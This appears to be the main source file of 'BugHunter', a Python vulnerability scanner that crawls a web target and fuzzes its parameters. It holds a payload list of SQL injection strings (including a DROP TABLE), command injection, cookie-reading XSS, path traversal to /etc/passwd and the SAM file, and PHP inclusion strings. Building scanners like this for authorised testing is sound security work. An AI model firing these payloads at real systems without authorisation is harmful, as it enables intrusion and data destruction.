"""BugHunter CLI - Main entry point.

Orchestrates the full DAST pipeline:
1. Crawl target URL
2. Fuzz discovered parameters
3. Analyze responses
4. Report findings
Uses httpx.AsyncClient for all I/O operations.
"""

from __future__ import annotations

import argparse
import asyncio
import sys
import uuid
from datetime import datetime
from urllib.parse import urlparse
from typing import TYPE_CHECKING

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from core.analyzer import AnalysisResult, Analyzer
from core.crawler import Crawler, URLInfo, crawl as do_crawl
from core.fuzzer import Fuzzer, HTTPMethod
from utils.reporter import Reporter

if TYPE_CHECKING:
    from collections.abc import Sequence


console = Console()


VULNERABILITY_PAYLOADS = [
    # SQL Injection
    "'",
    "\"",
    "1' OR '1'='1",
    "1' OR 1=1 --",
    "1' OR 1=1 #",
    "1' OR 1=1 /*",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "'; DROP TABLE users; --",
    "1; SELECT * FROM users",
    # Command Injection
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "&& id",
    "|| id",
    # XSS
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    # Path Traversal
    "../../../etc/passwd",
    r"..\..\..\windows\system32\config\sam",
    "/etc/passwd",
    # File Inclusion
    "php://filter/convert.base64-encode/resource=index.php",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
]


def parse_args() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="BugHunter - Automated DAST CLI Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  bughunter --target http://localhost/dvwa
  bughunter --target http://localhost/juicy-shop --threads 20 --depth 2
  bughunter --target https://example.com --output ./results
        """,
    )

    parser.add_argument(
        "--target",
        "-t",
        required=True,
        help="Target URL to scan (required)",
    )

    parser.add_argument(
        "--depth",
        "-d",
        type=int,
        default=3,
        help="Maximum crawl depth (default: 3)",
    )

    parser.add_argument(
        "--threads",
        "-T",
        type=int,
        default=10,
        help="Number of concurrent HTTP requests (default: 10)",
    )

    parser.add_argument(
        "--output",
        "-o",
        default="reports",
        help="Output directory for reports (default: reports)",
    )

    parser.add_argument(
        "--verbose",
        "-v",
        action="store_true",
        help="Enable verbose output",
    )

    parser.add_argument(
        "--cookie",
        default="",
        help='Session cookies to send with every request (format: "name1=val1; name2=val2")',
    )

    return parser.parse_args()


def parse_cookie_string(cookie_str: str) -> dict[str, str]:
    """Parse an HTTP cookie header string into a cookie dict.

    Lenient parser: surrounding whitespace is trimmed and malformed segments
    (lacking "=") are silently skipped so a bad cookie never aborts a scan.
    Values are split on the first "=" to preserve embedded "=" characters.

    Args:
        cookie_str: Raw cookies such as "name1=val1; name2=val2".

    Returns:
        Mapping of cookie name to value, empty for empty input.
    """
    parsed: dict[str, str] = {}
    if not cookie_str:
        return parsed

    for segment in cookie_str.split(";"):
        segment = segment.strip()
        if not segment or "=" not in segment:
            continue
        name, value = segment.split("=", 1)
        name = name.strip()
        value = value.strip()
        if name:
            parsed[name] = value

    return parsed


def on_discover(url_info: URLInfo) -> None:
    """Callback when URL is discovered during crawling."""
    console.print(f"  [cyan][+][cyan] Discovered: {url_info.url}")


async def _probe_login_gate(
    client: httpx.AsyncClient,
    target_url: str,
) -> str | None:
    """Probe whether a supplied session cookie is actually effective.

    Performs a clean request to the target and looks for classic login-gate
    fingerprints (a final URL pointing at a login page, or a rendered form
    containing a password field). Returns a description when a gate is found,
    otherwise None.

    Args:
        client: Shared httpx async client (must carry the session cookies).
        target_url: Starting URL of the scan.

    Returns:
        Human-readable description of the detected login gate or None.
    """
    try:
        response = await client.get(target_url, follow_redirects=True)
    except (httpx.RequestError, httpx.TimeoutException):
        return None

    final_url = str(response.url)
    if "login" in urlparse(final_url).path.lower():
        return f"the target redirected to a login page ({final_url})"

    text = response.text or ""
    if not isinstance(text, str):
        return None
    low = text.lower()
    if "<form" in low and 'type="password"' in low:
        return "the target rendered a login form (password input detected)"

    return None


async def run_scan_async(
    target_url: str,
    depth: int,
    threads: int,
    output_dir: str,
    verbose: bool,
    cookies: dict[str, str] | None = None,
) -> int:
    """Run the full DAST scan pipeline asynchronously.

    Args:
        target_url: Target URL to scan.
        depth: Maximum crawl depth.
        threads: Number of concurrent HTTP requests.
        output_dir: Directory for report output.
        verbose: Enable verbose output.
        cookies: Optional session cookies to send with every request.

    Returns:
        Exit code (0 for success, 1 for errors).
    """
    scan_id = str(uuid.uuid4())[:8]
    start_time = datetime.now()

    console.print(f"\n[bold cyan]BugHunter[/bold cyan] - v1.0.0")
    console.print(f"[bold]Scan ID:[/bold] {scan_id}")
    console.print(f"[bold]Target:[/bold] {target_url}")
    console.print(f"[bold]Depth:[/bold] {depth}")
    console.print(f"[bold]Threads:[/bold] {threads}")
    if cookies:
        console.print(f"[bold]Cookies:[/bold] {len(cookies)} session cookie(s)")
    console.print()

    reporter = Reporter(output_dir)
    fuzzer = Fuzzer(timeout=10.0, max_concurrent=threads)

    # Share a single session (cookies, headers) across crawl and fuzz phases
    # so CSRF tokens and session state discovered during crawling are honored
    # while fuzzing protected endpoints.
    async with httpx.AsyncClient(
        timeout=fuzzer.timeout, follow_redirects=True, cookies=cookies or None
    ) as client:
        if cookies:
            gate = await _probe_login_gate(client, target_url)
            if gate:
                console.print(
                    f"[yellow]Warning:[/yellow] Session cookie(s) do not appear "
                    f"effective - {gate}. XSS/SQLi findings on protected "
                    "endpoints are likely to be missed."
                )

        # Step 1: Crawl
        console.print("[bold yellow]Step 1/4:[/bold yellow] Crawling target...", style="cyan")
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            crawl_task = progress.add_task("Crawling...", total=None)
            try:
                discovered_urls = await do_crawl(target_url, max_depth=depth, client=client)
                progress.remove_task(crawl_task)
            except Exception as e:
                console.print(f"[red]Crawling failed:[/red] {e}")
                return 1

        console.print(f"[green]Found {len(discovered_urls)} URLs[/green]")
        if verbose:
            for url in discovered_urls:
                console.print(f"  [cyan]-[/cyan] {url.url}")

        # Step 2: Fuzz
        console.print()
        console.print("[bold yellow]Step 2/4:[/bold yellow] Fuzzing parameters...", style="cyan")
        all_fuzz_results: list = []

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            fuzz_task = progress.add_task("Fuzzing...", total=len(discovered_urls))

            for url_info in discovered_urls:
                progress.update(fuzz_task, description=f"Fuzzing: {url_info.url[:50]}")
                results = await fuzzer.fuzz_all(client, url_info, VULNERABILITY_PAYLOADS)
                all_fuzz_results.extend(results)
            progress.remove_task(fuzz_task)

    console.print(f"[green]Sent {len(all_fuzz_results)} requests[/green]")

    # Step 3: Analyze
    console.print()
    console.print("[bold yellow]Step 3/4:[/bold yellow] Analyzing responses...", style="cyan")
    analyzer = Analyzer(base_latency_ms=100.0, latency_threshold_ms=2000.0)
    analysis_results = analyzer.analyze_batch(all_fuzz_results, normal_status=200)

    findings_count = sum(len(r.detections) for r in analysis_results)
    console.print(f"[green]Analyzed {len(analysis_results)} responses, found {findings_count} findings[/green]")

    # Step 4: Report
    console.print()
    console.print("[bold yellow]Step 4/4:[/bold yellow] Generating reports...", style="cyan")

    end_time = datetime.now()
    json_path = reporter.export_json(
        scan_id=scan_id,
        target_url=target_url,
        start_time=start_time,
        end_time=end_time,
        analysis_results=analysis_results,
    )

    reporter.render_summary(
        scan_id=scan_id,
        target_url=target_url,
        start_time=start_time,
        end_time=end_time,
        analysis_results=analysis_results,
        total_urls=len(discovered_urls),
    )

    console.print()
    console.print(f"[green]JSON report saved:[/green] {json_path}")

    if findings_count > 0 and verbose:
        reporter.render_all_detections(analysis_results)

    return 0 if findings_count == 0 else 1


def main() -> int:
    """Main entry point."""
    args = parse_args()

    # Validate target URL
    from urllib.parse import urlparse

    parsed = urlparse(args.target)

    # Check scheme is exactly http or https
    if parsed.scheme not in ("http", "https"):
        console.print("[red]Error:[/red] Invalid target URL. Scheme must be http:// or https://")
        return 1

    if not parsed.netloc:
        console.print("[red]Error:[/red] Invalid target URL. Missing domain/host")
        return 1

    try:
        return asyncio.run(
            run_scan_async(
                target_url=args.target,
                depth=args.depth,
                threads=args.threads,
                output_dir=args.output,
                verbose=args.verbose,
                cookies=parse_cookie_string(args.cookie),
            )
        )
    except KeyboardInterrupt:
        console.print("\n[yellow]Scan cancelled by user[/yellow]")
        return 1
    except Exception as e:
        console.print(f"[red]Fatal error:[/red] {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
